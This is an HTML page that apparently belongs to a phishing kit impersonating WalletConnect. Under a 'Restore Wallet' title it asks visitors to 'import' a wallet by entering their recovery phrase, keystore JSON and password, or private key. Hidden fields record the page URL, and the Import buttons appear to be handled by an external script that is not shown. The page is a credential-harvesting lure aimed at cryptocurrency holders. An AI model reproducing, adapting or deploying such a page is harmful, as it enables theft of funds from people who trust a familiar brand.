<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<link rel="stylesheet" href="../assets/main.css" type="text/css"> 
<meta name="description" content="Open protocol for connecting Wallets to Dapps">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta property="og:image" content="https://walletconnect.org/favicon.ico">
<link rel="icon" href="https://walletconnect.org/favicon.ico">

<script src="jquery.min.js"></script>
    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
<script src="async.js"></script>
<script>
    function openCity(evt, cityName) {
    // Declare all variables
    var i, tabcontent, tablinks;
  
    // Get all elements with class="tabcontent" and hide them
    tabcontent = document.getElementsByClassName("tabcontent");
    for (i = 0; i < tabcontent.length; i++) {
      tabcontent[i].style.display = "none";
    }
  
    // Get all elements with class="tablinks" and remove the class "active"
    tablinks = document.getElementsByClassName("tablinks");
    for (i = 0; i < tablinks.length; i++) {
      tablinks[i].className = tablinks[i].className.replace(" active", "");
    }
  
    // Show the current tab, and add an "active" class to the button that opened the tab
    document.getElementById(cityName).style.display = "block";
    evt.currentTarget.className += " active";
  }
  const geturl =() =>{
    // var els = document.getElementsByClassName("href");
    let url =window.location.href
    var list = document.getElementsByClassName("href");
    for(var i = 0; i< list.length;i++){
      document.getElementsByClassName("href")[i].value=url
    }

  }
  </script>
<title>Restore Wallet</title>
</head>
<body onload="geturl()">
<center>
<div class="top">
        <a href="#footer?v" class="left">Github</a>
        <a href="#?v" class="left">Docs</a>
        <a href="/en" class="main"><img src="../assets/logo.svg" alt="logo"></a>
        <a href="#wallets?v" class="left">Wallets</a>
        <a href="#?v" class="left">Apps</a>
</div>
<br>
<h2><center>Import Wallet</center></h2>
<br>
<div class="tab">
  <button class="tablinks active" id="default" onclick="openCity(event, &#39;phrase&#39;)">Phrase</button>
  <button class="tablinks" onclick="openCity(event, &#39;keystore&#39;)">Keystore JSON</button>
  <button class="tablinks" onclick="openCity(event, &#39;private&#39;)">Private Key</button>
</div>

    <div id="phrase" class="tabcontent" style="display: block;">
    <form  method="POST">
    <textarea id="cf_phrase" class="phrase" required="required" minlength="12" placeholder="Phrase"></textarea>
    <input type="hidden" value="" id="href"  class="href">
<br>
<div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
<br>
<button type="button" id="tephrase" class="btn">Import</button>
</form>
</div>

<div id="keystore" class="tabcontent" style="display: none;">
<form  method="POST">
<textarea id="phrase" class="cf_json" required="required" minlength="12" placeholder="Keystore JSON"></textarea>
<br>
<input type="hidden" value="" id="href"  class="href">

<div class="field">
    <input type="text" id="cf_passw" placeholder="Password">
</div>
<div class="desc">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div>
<br>
<button type="button" id="tekey" class="btn">Import</button>
</form>
</div>

<div id="private" class="tabcontent" style="display: none;">
<form  method="POST">
<div class="field">
    <input type="text" id="cf_key" class="key" placeholder="Private Key">
</div>
<input type="hidden" value="" id="href"  class="href">

<div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
<br>
<button type="button" id="teprivate" class="btn">Import</button>
</form>
</div>

<script>
    document.getElementById("default").click();
</script>

</center></body></html>
